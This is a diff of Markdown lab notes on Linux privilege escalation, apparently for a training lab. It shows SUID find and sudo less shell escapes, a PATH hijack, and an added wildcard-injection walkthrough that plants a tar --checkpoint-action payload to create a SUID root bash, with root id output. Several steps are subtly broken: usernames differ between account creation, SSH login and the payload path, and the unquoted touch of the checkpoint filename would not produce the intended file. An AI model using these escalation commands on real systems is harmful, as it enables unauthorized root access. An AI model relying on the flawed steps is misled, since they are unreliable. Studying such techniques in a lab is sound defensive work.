@@ -41,6 +41,10 @@ find / -perm -4000 2>/dev/null
 Go to [GTFOBins](https://gtfobins.org/)
 
 /opt/vuln_suid/find . -exec /bin/sh -p \; -quit
+````
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 
@@ -114,8 +118,10 @@ echo $PATH
 Expected : `/tmp:...............`
 ```
 sudo /opt/path_lab/backup.sh
-
-whoami -> root
+```
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ## 🟢 Checking Sudo Rights
@@ -149,9 +155,76 @@ sudo /usr/bin/less /etc/hosts
 ```
 !/bin/bash
 ```
-Got root
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 
 
 ## 🟢 Wildcard Injection
+
+
+#### On the Victim machine - DO THIS
+```
+sudo useradd -m hacker_sudo
+sudo passwd hacker_sudo
+```
+```
+sudo mkdir /opt/wild_lab
+sudo chmod 777 /opt/wild_lab
+ls -ld /opt/wild_lab
+```
+```
+sudo nano /opt/wild_lab/backup.sh
+```
+Put: 
+```
+#!/bin/bash
+
+cd /opt/wild_lab
+tar czf backup.tar.gz *
+```
+
+```
+sudo chmod +x /opt/wild_lab/backup.sh
+```
+
+```
+sudo nano /etc/crontab
+```
+Add : `* * * * * root /opt/wild_lab/backup.sh`
+ 
+
+
+#### On the Attacker machine - DO THIS
+
+```
+ssh hacker_wild@VICTIM_IP
+```
+```
+cat /etc/crontab
+```
+
+Create Payload:
+```
+echo 'cp /bin/bash /home/hacker_wildcard_injection/rootbash && chmod +s /home/hacker_wildcard_injection/rootbash' > /opt/wild_lab/shell.sh
+chmod +x /opt/wild_lab/shell.sh
+```
+
+```
+touch /opt/wild_lab/--checkpoint-action=exec=sh shell.sh
+touch /opt/wild_lab/--checkpoint=1
+```
+
+```
+ls -l /home/hacker_wildcard_injection/rootbash
+/home/hacker_wildcard_injection/rootbash -p
+```
+```
+id
+uid=1004(hacker_wildcard_injection) gid=1004(hacker_wildcard_injection) euid=0(root) egid=0(root) groups=0(root),1004(hacker_wildcard_injection)
+```
+
+
 
